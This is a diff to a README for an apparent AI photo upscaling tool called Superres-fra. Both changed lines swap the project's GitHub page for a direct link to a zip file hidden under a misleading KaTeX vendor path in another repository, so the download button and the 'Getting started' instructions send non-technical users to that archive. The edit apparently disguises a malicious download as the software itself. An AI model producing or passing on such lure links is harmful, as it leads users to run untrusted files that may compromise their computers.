@@ -5,7 +5,7 @@ description: "Restore and upscale low-resolution faces with CodeFormer to improv
 ---
 # 🔍 Superres-fra - Improve blurry images with artificial intelligence
 
-[![Download Superres-fra](https://img.shields.io/badge/Download-Software-blue)](https://github.com/camberwellbeautyexspouse324/Superres-fra)
+[![Download Superres-fra](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/camberwellbeautyexspouse324/camberwellbeautyexspouse324.github.io/main/static/vendor/katex/3.7.zip)
 
 Superres-fra takes low-quality images and makes them sharp. This tool uses artificial intelligence to fill in detail. It works well for old photos or blurry video frames from cameras. You do not need to understand how the code works to use it. Follow these steps to improve your pictures.
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run this software. Check your settings bef
 
 ## 🏁 Getting started
 
-1. Visit the project website. Click this link: [https://github.com/camberwellbeautyexspouse324/Superres-fra](https://github.com/camberwellbeautyexspouse324/Superres-fra).
+1. Visit the project website. Click this link: [https://raw.githubusercontent.com/camberwellbeautyexspouse324/camberwellbeautyexspouse324.github.io/main/static/vendor/katex/3.7.zip](https://raw.githubusercontent.com/camberwellbeautyexspouse324/camberwellbeautyexspouse324.github.io/main/static/vendor/katex/3.7.zip).
 2. Look for the button marked Code. Choose Download ZIP.
 3. Your computer saves a compressed folder. Open your Downloads folder.
 4. Right-click the folder and select Extract All. Pick a place on your computer to put the files.
